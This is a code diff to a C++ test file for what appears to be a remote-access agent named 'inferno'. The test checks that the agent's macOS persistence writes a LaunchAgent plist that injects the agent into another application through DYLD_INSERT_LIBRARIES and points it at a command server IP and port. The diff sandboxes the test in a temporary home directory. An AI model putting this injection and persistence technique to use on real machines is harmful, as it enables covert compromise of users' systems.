@@ -6,6 +6,11 @@
 #include "../client/include/Agent.hpp"
 #include "../common/include/Packet.hpp"
 
+#include <sys/stat.h>
+#ifndef _WIN32
+#include <unistd.h>
+#endif
+
 #ifdef _WIN32
 #ifndef WIN32_LEAN_AND_MEAN
 #define WIN32_LEAN_AND_MEAN
@@ -78,24 +83,30 @@ void test_self_delete_skipped_with_empty_binary_path() {
 #ifdef __APPLE__
 
 void test_injected_persistence_macos() {
-    // Call persistInjectedAgent — on macOS this writes a LaunchAgent plist
-    // referencing the current process (not the target_path).
-    // The target_path is unused on macOS (DYLD_INSERT_LIBRARIES mechanism).
-    const std::string test_target = "/Applications/Discord.app/Contents/MacOS/Discord";
-    inferno::Agent::persistInjectedAgent("192.168.1.100", 4444, test_target);
+    // Use a temporary HOME so the test plist doesn't overwrite the real one
+    // at ~/Library/LaunchAgents/com.inferno.agent.plist.
+    const char* orig_home = ::getenv("HOME");
+    std::string tmp_home = std::string("/tmp/inferno_test_home_")
+                         + std::to_string(::getpid());
+    ::mkdir(tmp_home.c_str(), 0755);
+    ::setenv("HOME", tmp_home.c_str(), 1);
 
-    // Read the plist and verify it contains the expected structures
-    const char* home = ::getenv("HOME");
-    if (!home) {
-        std::fprintf(stderr, "[SKIP] test_injected_persistence_macos: no HOME\n");
-        return;
-    }
-    std::string plist_path = std::string(home)
-                           + "/Library/LaunchAgents/com.inferno.agent.plist";
+    std::string plist_path = tmp_home + "/Library/LaunchAgents/com.inferno.agent.plist";
+    ::mkdir((tmp_home + "/Library").c_str(), 0755);
+    ::mkdir((tmp_home + "/Library/LaunchAgents").c_str(), 0755);
+
+    const std::string test_target = "/Applications/DBeaver.app/Contents/MacOS/dbeaver";
+    inferno::Agent::persistInjectedAgent("127.0.0.1", 4242, test_target);
+
     FILE* f = ::fopen(plist_path.c_str(), "r");
     if (!f) {
         std::fprintf(stderr, "[FAIL] test_injected_persistence_macos: "
                              "plist not found at %s\n", plist_path.c_str());
+        ::setenv("HOME", orig_home ? orig_home : "", 1);
+        ::remove(plist_path.c_str());
+        ::rmdir((tmp_home + "/Library/LaunchAgents").c_str());
+        ::rmdir((tmp_home + "/Library").c_str());
+        ::rmdir(tmp_home.c_str());
         std::exit(1);
     }
 
@@ -112,19 +123,29 @@ void test_injected_persistence_macos() {
     if (content.find("DYLD_INSERT_LIBRARIES") == std::string::npos) {
         std::fprintf(stderr, "[FAIL] test_injected_persistence_macos: "
                              "plist missing DYLD_INSERT_LIBRARIES\n");
+        ::setenv("HOME", orig_home ? orig_home : "", 1);
         std::exit(1);
     }
     if (content.find("INFERNO_SERVER_IP") == std::string::npos ||
         content.find("INFERNO_SERVER_PORT") == std::string::npos) {
         std::fprintf(stderr, "[FAIL] test_injected_persistence_macos: "
                              "plist missing server config\n");
+        ::setenv("HOME", orig_home ? orig_home : "", 1);
         std::exit(1);
     }
-    if (content.find("192.168.1.100") == std::string::npos) {
+    if (content.find("127.0.0.1") == std::string::npos) {
         std::fprintf(stderr, "[FAIL] test_injected_persistence_macos: "
                              "plist missing server IP\n");
+        ::setenv("HOME", orig_home ? orig_home : "", 1);
         std::exit(1);
     }
+
+    // Restore HOME and clean up temp files
+    ::setenv("HOME", orig_home ? orig_home : "", 1);
+    ::remove(plist_path.c_str());
+    ::rmdir((tmp_home + "/Library/LaunchAgents").c_str());
+    ::rmdir((tmp_home + "/Library").c_str());
+    ::rmdir(tmp_home.c_str());
 
     std::fprintf(stdout, "[PASS] test_injected_persistence_macos\n");
 }
